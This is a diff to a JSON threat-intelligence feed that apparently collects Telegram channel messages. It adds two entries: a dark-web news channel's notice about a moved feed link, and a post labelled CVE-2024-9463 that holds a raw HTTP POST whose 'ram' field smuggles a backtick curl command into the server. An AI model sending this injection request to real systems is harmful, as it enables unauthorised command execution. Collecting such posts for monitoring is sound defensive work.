@@ -17344,6 +17344,18 @@
             "URLs": [
                 "ps://darkwebinformer.com/a-threat-actor-is-allegedly-selling-data-of-bumble4friends/"
             ]
+        },
+        {
+            "Message ID": 5451,
+            "Date": "2024-10-15",
+            "Content": "🚨🚨I have updated the Threat Feed link. You can find the different feeds under the 'Threat Feeds' in the navigation bar on the header or by clicking here: https://darkwebinformer.com/tag/threat-feeds/\n\nYou are probably on the old link which has been unpublished so please move to the new link.\n\nPlus Threat Feed will be coming in the next day or so.",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": [
+                "tps://darkwebinformer.com/tag/threat-feeds/\n\n"
+            ]
         }
     ],
     "RipperSec | РипперСек": [
@@ -22605,6 +22617,16 @@
                 "172.67.23.215",
                 "172.67.23.215"
             ]
+        },
+        {
+            "Message ID": 2295,
+            "Date": "2024-10-15",
+            "Content": "CVE-2024-9463\n\nPOST /API/convertCSVtoParquet.php HTTP/1.1\nHost: \nContent-Type: application/x-www-form-urlencoded\n \nram=watchTowr`curl+`",
+            "Attack Type": "Unknown",
+            "Location": [
+                "N/A"
+            ],
+            "URLs": []
         }
     ],
     "Anonymous Chat": [
